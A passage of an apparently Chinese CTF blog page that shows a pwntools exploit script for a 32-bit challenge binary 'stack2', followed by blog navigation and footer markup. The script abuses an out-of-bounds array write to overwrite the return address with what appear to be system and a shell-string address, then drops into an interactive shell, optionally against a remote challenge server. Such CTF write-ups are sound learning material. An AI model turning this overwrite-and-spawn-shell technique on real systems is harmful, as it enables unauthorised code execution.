+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g_local=<span class="literal">True</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g_local:</span><br><span class="line">	sh = process(<span class="string">'./stack2'</span>)<span class="comment">#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125;</span></span><br><span class="line">	gdb.attach(sh)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	sh = remote(<span class="string">"47.96.239.28"</span>, <span class="number">2333</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_byte</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	sh.send(<span class="string">"3\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"which number to change:\n"</span>)</span><br><span class="line">	sh.send(str(off) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"new number:\n"</span>)</span><br><span class="line">	sh.send(str(val) + <span class="string">"\n"</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_dword</span><span class="params">(off, val)</span>:</span></span><br><span class="line">	write_byte(off, val &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">1</span>, (val &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">2</span>, (val &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">	write_byte(off + <span class="number">3</span>, (val &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	sh.send(<span class="string">"5\n"</span>)</span><br><span class="line">	sh.interactive()</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"How many numbers you have:\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Give me your numbers\n"</span>)</span><br><span class="line">sh.send(<span class="string">"1\n"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line"></span><br><span class="line">write_dword(<span class="number">0x84</span>, <span class="number">0x8048450</span>)</span><br><span class="line">write_dword(<span class="number">0x8C</span>, <span class="number">0x8048980</span> + <span class="number">7</span>)</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/09/04/GDB▒╩╝╟/" rel="next" title="GDB笔记">
+                  <i class="fa fa-chevron-left"></i> GDB笔记
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/09/╧╓┤·├▄┬δ╤º╓«╢α▒φ╝╙├▄/" rel="prev" title="现代密码学之多表加密">
+                  现代密码学之多表加密 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
